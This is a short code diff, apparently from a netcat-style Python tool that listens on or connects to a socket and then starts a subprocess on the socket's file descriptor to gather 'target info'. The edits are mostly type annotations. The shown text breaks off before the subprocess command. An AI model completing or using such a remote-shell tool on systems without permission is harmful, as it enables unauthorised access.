@@ -60,26 +60,27 @@ def main() -> None:
     # Create the socket and connection depending on the input:
     print("Creating soocket...")
     connection: socket.socket | None = None
+    sub_proc: None | int = 0
 
     # Server mode
     if args.cmd == "listen":
-        SERVER_IP = "0.0.0.0"
-        SERVER_PORT = args.port
+        SERVER_IP: str = "0.0.0.0"
+        SERVER_PORT: str = args.port
 
         # Create a socket:
         ls: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ls.bind((SERVER_IP, SERVER_PORT))
+        ls.bind((SERVER_IP, int(SERVER_PORT)))
         ls.listen()
 
         # Set connection:
         print("Trying connection...")
         connection, addr = ls.accept()
-        sub_proc = "No"
+        sub_proc = 0
 
     # Client mode
     elif args.cmd == "connect":
-        HOST_IP = args.host_ip
-        HOST_PORT = args.port
+        HOST_IP: str = args.host_ip
+        HOST_PORT: str = args.port
 
         # Create a socket:
         cs: socket.socket | None = None
@@ -120,7 +121,7 @@ def main() -> None:
         if sub_proc is None:
             # make a subprocess to use for extracting target info
             try:
-                socket_file_no = current_connection.socket.fileno()
+                socket_file_no: int = current_connection.socket.fileno()
 
                 sub_proc = subprocess.call(
                     [
